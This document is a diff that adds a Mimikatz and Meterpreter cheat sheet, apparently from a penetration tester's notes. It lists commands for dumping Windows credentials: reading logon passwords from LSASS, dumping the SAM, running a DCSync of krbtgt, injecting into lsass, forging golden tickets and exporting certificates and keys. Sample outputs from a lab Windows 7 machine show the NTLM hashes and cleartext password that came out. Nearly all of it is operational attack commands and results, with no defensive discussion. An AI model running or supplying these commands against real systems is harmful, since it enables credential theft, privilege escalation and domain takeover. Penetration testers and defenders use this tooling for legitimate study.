@@ -1,0 +1,307 @@
+- meterpreter > load mimikatz
+- meterpreter > kerberos 
+- meterpreter > msv
+
+- mimikatz # system::user
+- mimikatz # system::computer
+- mimikatz # Crypto listProviders
+- mimikatz # Crypto listStores CERT_SYSTEM_STORE_LOCAL_MACHINE
+- mimikatz # Crypto listCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE Root
+- mimikatz # Crypto listKeys
+- mimikatz # samdump::bootkey
+- mimikatz # privilege::debug
+- mimikatz # sekurlsa::logonpasswords
+- mimikatz # sekurlsa::tickets /export
+- mimikatz # kerberos::list /export
+- mimikatz # inject::process lsass.exe sekurlsa.dll
+- mimikatz # inject::pid lsass.exe sekurlsa.dll
+- mimikatz # lsadump::sam
+- mimikatz # lsadump::lsa /id:500
+- mimikatz # lsadump::lsa /inject /name:krbtgt
+- mimikatz # lsadump::lsa /patch
+- mimikatz # privilege::debug
+- mimikatz # lsadump::sam SystemBkup.hiv SamBkup.hiv
+- sekurlsa::tickets /export
+- token::whoami
+- token::elevate
+- kerberos::list /export
+- kerberos::ptt c:\chocolate.kirbi
+- kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
+- crypto::capi
+- crypto::cng
+- crypto::certificates /export
+- crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+- crypto::keys /export
+- crypto::keys /machine /export
+- vault::cred
+- vault::list
+
+
+token::elevate
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+token::revert
+
+lsadump::dcsync /user:domain\krbtgt /domain:lab.local
+
+
+==========================
+Show all mimikatz modules
+
+- mimikatz_command -f fu::
+
+Module : 'fu' introuvable
+
+Modules disponibles : 
+            	- Standard
+      crypto	- Cryptographie et certificats
+        hash	- Hash
+      system	- Gestion syst?me
+     process	- Manipulation des processus
+      thread	- Manipulation des threads
+     service	- Manipulation des services
+   privilege	- Manipulation des privil?ges
+      handle	- Manipulation des handles
+ impersonate	- Manipulation tokens d'acc?s
+     winmine	- Manipulation du d?mineur
+ minesweeper	- Manipulation du d?mineur 7
+       nogpo	- Anti-gpo et patchs divers
+     samdump	- Dump de SAM
+      inject	- Injecteur de librairies
+          ts	- Terminal Server
+      divers	- Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
+    sekurlsa	- Dump des sessions courantes par providers LSASS
+         efs	- Manipulations EFS
+
+=====================
+
+[Samples #1]
+
+mimikatz # lsadump::sam
+Domain : W7-PC
+SysKey : a2fc0cdcf364032e97248feb9d88b66a
+Local SID : S-1-5-21-4143378816-2706433924-1685450628
+
+SAMKey : 1287c538b54d85967dfaf4035f48c742
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   : 
+NTLM : 31d6cfe0d16ae931b73c00d7e0c000c0
+
+RID  : 000001f5 (501)
+User : Guest
+LM   : 
+NTLM : 
+
+RID  : 000003e8 (1000)
+User : w7
+LM   : 
+NTLM : 81d6cfe0d16ae931b73c00d7e0c000c0
+
+RID  : 000003e9 (1001)
+User : ksanchez
+LM   : 
+NTLM : 608107e444136f9aab331d3f00a72c22
+
+------------------------------------------
+[Sample #2]
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 367722 (00000000:00059c6a)
+Session           : Interactive from 1
+User Name         : w7
+Domain            : w7-PC
+Logon Server      : W7-PC
+Logon Time        : 7/13/2016 10:56:04 AM
+SID               : S-1-5-21-4143378816-2706433924-1685450628-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * LM       : 7775a6099dadd30b95873f3421ecab49
+	 * NTLM     : 819bf5b3240a3a66ee5cb82917ff1dd2
+	 * SHA1     : 7f78f1ddfc70a8357ff9ca5c98d5010b276478f8
+	tspkg :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	wdigest :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	kerberos :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 367693 (00000000:00059c4d)
+Session           : Interactive from 1
+User Name         : w7
+Domain            : w7-PC
+Logon Server      : W7-PC
+Logon Time        : 7/13/2016 10:56:04 AM
+SID               : S-1-5-21-4143378816-2706433924-1685450628-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * LM       : 7775a6099dadd30b95873f3421ecab49
+	 * NTLM     : 819bf5b3240a3a66ee5cb82917ff1dd2
+	 * SHA1     : 7f78f1ddfc70a8357ff9ca5c98d5010b276478f8
+	tspkg :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	wdigest :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	kerberos :	
+	 * Username : w7
+	 * Domain   : w7-PC
+	 * Password : [P#sSWorPlan0]
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/13/2016 9:40:01 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : W7-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/13/2016 9:40:01 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : W7-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : w7-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 21386 (00000000:0000538a)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/13/2016 9:40:00 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : W7-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/13/2016 9:40:00 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : W7-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : w7-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :
+---------------------------------
+[Sample #3]
+
+vault::list
+
+Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
+	Name       : My KeyRing
+	Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+	Items (0)
+
+Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
+	Name       : Windows Vault
+	Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
+	Items (0)
+
+---------------------------------
+[Sample #4]
+
+meterpreter > msv
+[!] Not currently running as SYSTEM
+[*] Attempting to getprivs
+[+] Got SeDebugPrivilege
+[*] Retrieving msv credentials
+msv credentials
+===============
+
+AuthID    Package    Domain        User           Password
+------    -------    ------        ----           --------
+0;111287  NTLM       w7-PC         w7             lm{ 7775a6088dadd30b95873f3421ecab49 }, ntlm{ 820bf5b3240a3a66ee5cb82917ff1dd2 }
+0;111241  NTLM       w7-PC         w7             lm{ 7775a6000dadd30b95873f3421ecab49 }, ntlm{ 817bf5b3240a3a66ee5cb82917ff1dd2 }
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
+0;996     Negotiate  WORKGROUP     W7-PC$         n.s. (Credentials KO)
+0;22557   NTLM                                    n.s. (Credentials KO)
+0;999     NTLM       WORKGROUP     W7-PC$         n.s. (Credentials KO)
+
+--------------------------------
+[Sample #5]
+
+meterpreter > kerberos 
+[!] Not currently running as SYSTEM
+[*] Attempting to getprivs
+[+] Got SeDebugPrivilege
+[*] Retrieving kerberos credentials
+kerberos credentials
+====================
+
+AuthID    Package    Domain        User           Password
+------    -------    ------        ----           --------
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
+0;996     Negotiate  WORKGROUP     W7-PC$         
+0;22557   NTLM                                    
+0;999     NTLM       WORKGROUP     W7-PC$         
+0;111287  NTLM       w7-PC         w7             [P#sSWorPlan0]
+0;111241  NTLM       w7-PC         w7             [P#sSWorPlan0]
+
+
+
+https://www.offensive-security.com/metasploit-unleashed/mimikatz/
+https://www.sans.org/reading-room/whitepapers/tools/mimikatz-overview-defenses-detection-36780
+https://github.com/gentilkiwi/mimikatz
+https://github.com/gentilkiwi/mimikatz/releases
+http://blog.gentilkiwi.com/mimikatz
